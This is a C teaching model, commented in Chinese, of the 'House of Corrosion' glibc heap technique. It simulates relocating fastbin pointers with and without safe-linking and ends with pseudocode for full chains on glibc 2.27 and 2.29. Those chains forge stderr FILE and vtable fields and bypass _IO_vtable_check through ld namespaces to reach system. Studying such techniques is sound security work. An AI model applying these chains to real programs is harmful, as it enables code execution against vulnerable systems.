/*
 * House of Corrosion 的 fastbin 指针搬运汇总模型。
 *
 * 版本范围：
 *   glibc 2.27～2.31：victim->fd 保存的是明文；
 *   glibc 2.32～2.36：victim->fd 使用 safe-linking 编码；
 *   glibc 2.37 起：global_max_fast 缩成了 uint8_t，无法再构造远端索引。
 *
 * 漏洞模型：假设攻击者已经放大了 global_max_fast，能够反复修改同一个
 * 已释放 victim 的 size/fd 字段，让它临时出现在不同的远端 fastbin 头槽中。
 *
 * 成功效果：把“源槽”里的 libc 指针搬到可编辑的中转区，修改后再搬到
 * “目标槽”。真实利用中这些槽位都位于 libc/ld 内，这里用数组表示连续的
 * qword，从而把关键公式和指针流转完整展开出来，而不是伪造某个具体发行版
 * 的固定地址。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define FASTBIN_INDEX(size) (((size) >> 4) - 2)
#define PROTECT_PTR(position, pointer)                                         \
  ((((size_t)(position)) >> 12) ^ ((size_t)(pointer)))

int main(void) {
  /* 数组第 0 项代表 main_arena.fastbinsY[0]。 */
  size_t fastbins_y[64] = {0};

  /* 使用真实的堆地址，这样 2.32 起 fd 编码用的 key 才具有真实地址语义。 */
  size_t *victim = malloc(0x30);
  size_t *fd = &victim[0];

  /* 演示中用到的三个远端槽索引。 */
  size_t source_index = 8;
  size_t relay_index = 24;
  size_t target_index = 40;

  /*
   * x86-64 上的公式：
   *     fastbin_index(size) = (size >> 4) - 2
   *     size = index * 0x10 + 0x20
   *
   * 如果手里拿到的是实际地址 target，而不是数组索引，就换算成：
   *     delta = target - &main_arena.fastbinsY[0]
   *     size = 2 * delta + 0x20
   *     request = (size & ~7) - 0x10        // 换回 malloc 的用户请求大小
   */
  size_t source_size = source_index * 0x10 + 0x20;
  size_t relay_size = relay_index * 0x10 + 0x20;
  size_t target_size = target_index * 0x10 + 0x20;

  assert(FASTBIN_INDEX(source_size) == source_index);
  assert(FASTBIN_INDEX(relay_size) == relay_index);
  assert(FASTBIN_INDEX(target_size) == target_index);

  /* 源槽里原本有一个希望搬走的 libc 指针。 */
  size_t source_value = 0x7ffff7e12040;
  fastbins_y[source_index] = source_value;

  /* ---------- 2.27～2.31：明文 fd ---------- */

  /* 漏洞模拟：把 victim 的 size 改成源槽对应的物理大小。 */
  victim[-1] = source_size | 1;

  /* 旧版 `_int_free` 会把源槽旧值直接放进 victim->fd。 */
  *fd = fastbins_y[source_index];
  fastbins_y[source_index] = (size_t)(victim - 2);

  /* 漏洞模拟：让 victim 成为中转区头槽当前可取出的节点。 */
  victim[-1] = relay_size | 1;
  fastbins_y[relay_index] = (size_t)(victim - 2);

  /* 旧版 `_int_malloc` 把明文 victim->fd 写回中转区头槽。 */
  fastbins_y[relay_index] = *fd;
  assert(fastbins_y[relay_index] == source_value);

  /* 已经取得中转区对应 chunk 后，可以编辑搬入的明文指针。 */
  size_t modified_value = 0x7ffff7e12ab0;
  fastbins_y[relay_index] = modified_value;

  /* 再按同样顺序把中转区的修改值搬到最终目标槽。 */
  victim[-1] = relay_size | 1;
  *fd = fastbins_y[relay_index];
  fastbins_y[relay_index] = (size_t)(victim - 2);

  victim[-1] = target_size | 1;
  fastbins_y[target_index] = (size_t)(victim - 2);
  fastbins_y[target_index] = *fd;

  assert(fastbins_y[target_index] == modified_value);

    /* ---------- 2.32～2.36：使用 safe-linking 编码 fd ---------- */

  /* 重置三个槽，重新演示同一思想在 safe-linking 下的实现。 */
  fastbins_y[source_index] = source_value;
  fastbins_y[relay_index] = (size_t)(victim - 2);
  fastbins_y[target_index] = 0;

  victim[-1] = source_size | 1;

  /* 新版 free 把“源槽明文值”按 fd 字段地址编码后写进 victim->fd。 */
  *fd = PROTECT_PTR(fd, fastbins_y[source_index]);
  fastbins_y[source_index] = (size_t)(victim - 2);

  victim[-1] = relay_size | 1;

  /* 新版 malloc 解码 victim->fd，再把明文写回中转区头槽。 */
  fastbins_y[relay_index] = PROTECT_PTR(fd, *fd);
  assert(fastbins_y[relay_index] == source_value);

  fastbins_y[relay_index] = modified_value;
  fastbins_y[target_index] = (size_t)(victim - 2);

  victim[-1] = relay_size | 1;
  *fd = PROTECT_PTR(fd, fastbins_y[relay_index]);
  fastbins_y[relay_index] = (size_t)(victim - 2);

  victim[-1] = target_size | 1;
  fastbins_y[target_index] = PROTECT_PTR(fd, *fd);

  assert(fastbins_y[target_index] == modified_value);
  printf("[+] 指针搬运完成\n");

  /* victim 的 size 已被故意破坏，教学模型直接退出，不再 free。 */
  return 0;
}

/*
 * ======================== 真实链迁移伪代码 ========================
 *
 * 一、原版 glibc 2.27，基于原作者使用的 Ubuntu 18.04 Build ID：
 *
 *     先准备好可以反复编辑的 freed victim、unsorted victim，以及一块用来
 *     存放检查用安全值的区域；接着猜出 libc 地址的低四位；再用 2.27 上
 *     还能用的 unsorted bin attack 放大 global_max_fast。
 *     对每一个想搬运的 libc 目标，都按下面的公式算出对应的 chunk size：
 *         delta = target - main_arena.fastbinsY；
 *         chunk_size = 2 * delta + 0x20；
 *         malloc_request = (chunk_size & ~7) - 0x10； // 换回 malloc 的用户请求大小
 *     然后按照“源槽 -> 可编辑中转区 -> 目标槽”的顺序，把 __morecore 等
 *     指针搬运过去；修改 stderr 的 flags、write_ptr、buf_base、buf_end
 *     和 vtable 字段；利用 2.27 仍然会消费的 FILE+0xe0 旧版 allocate 回调，
 *     再制造出 largebin/NON_MAIN_ARENA 断言，让 stderr 真正走到消费路径。
 *     最后一定要验证回调收到的参数或实际的控制流是否符合预期，不能只
 *     看程序是否崩溃就当作成功。
 *
 * 二、Addendum glibc 2.29，基于原作者使用的 Ubuntu 19.04 Build ID：
 *
 *     这一版至少需要约 11 字节的连续 WAF 能力。先用 tcache poisoning
 *     代替已经被加固的旧版 unsorted 写；再覆盖 global_max_fast，建立起
 *     相对写和指针搬运能力；然后把 _rtld_global._dl_ns[0]._ns_loaded
 *     搬到 namespace 1，清空 namespace 0，并把 libc 的 link_map.l_ns
 *     改成 1，这样就能让 _IO_vtable_check 走到“非默认命名空间”对应的
 *     放行分支；最后让 stderr.vtable 指向堆上伪造的 vtable。实际操作时
 *     还要按照附件反汇编重新挑选合适的 gadget，并核对寄存器状态和
 *     system 调用的参数是否正确。
 *
 * 三、真正的版本边界：
 *
 *     2.28 删除了旧版 `_IO_strfile` 回调，所以 2.27 的完整链首先在这里
 *     失去了最终触发点；2.32 起就必须像本文件第二段那样正确编码
 *     victim->fd 才能继续搬运；2.37 把 global_max_fast 缩成了 uint8_t，
 *     最大物理 size 只有 0xf0，能索引到的范围最远也就在 fastbinsY+0x68
 *     附近，已经碰不到远端的 libc/ld 槽了。到这一步，核心投递思路已经
 *     彻底失效，不是简单调一下偏移就能恢复的。
 */
